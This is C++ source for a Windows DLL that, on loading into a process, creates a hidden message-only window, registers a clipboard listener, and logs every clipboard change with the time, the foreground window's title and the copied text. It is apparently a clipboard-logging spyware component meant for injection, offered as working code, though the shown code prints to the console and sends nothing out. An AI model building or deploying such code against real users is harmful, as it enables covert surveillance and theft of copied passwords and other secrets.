// dllmain.cpp : Définit le point d'entrée de l'application DLL.

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include<time.h>

LRESULT CALLBACK __WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void printClipboard();
#pragma warning(disable : 4996)
BOOL WINAPI DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        const wchar_t CLASS_NAME[] = L"Desktop App";

        WNDCLASS wc = { 0 };

        wc.lpfnWndProc = __WndProc;
        wc.hInstance = NULL;
        wc.lpszClassName = "Desktop App";

        RegisterClass(&wc);

        // Create the window.

        HWND hwnd = CreateWindowExW(
            0,
            CLASS_NAME,             // Window class
            L"Test Desktop App",    // Window text
            WS_DISABLED,            // Window style

            // Size and position
            CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,

            HWND_MESSAGE,       // Parent window    
            NULL,       // Menu
            NULL,  // Instance handle
            NULL        // Additional application data
        );

        MSG msg = { 0 };
        int timeOfMonitoring;
        while (GetMessage(&msg, NULL, 0, 0))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

LRESULT CALLBACK __WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_CREATE:
        AddClipboardFormatListener(hwnd);
        break;
    case WM_CLIPBOARDUPDATE:
        printClipboard();
        break;
    }

    return DefWindowProcA(hwnd, uMsg, wParam, lParam);
}

void printClipboard()
{
    TCHAR windowsName[250];
    int maxSizeName = 250;
    time_t tm;
    time(&tm);
    HWND foreground = GetForegroundWindow();
    GetWindowTextA(foreground, windowsName, maxSizeName);
    HANDLE h;

    if (!OpenClipboard(NULL))
        printf("Can't open clipboard\n");
    else
    {
        h = GetClipboardData(CF_TEXT);
        printf("[+] Clipboard updated !\n[!] Date : %s[!] Active Windows : %s\n[!] Content : %s\n----------------------------------\n", ctime(&tm), windowsName, (char*)h);
    }
    CloseClipboard();
}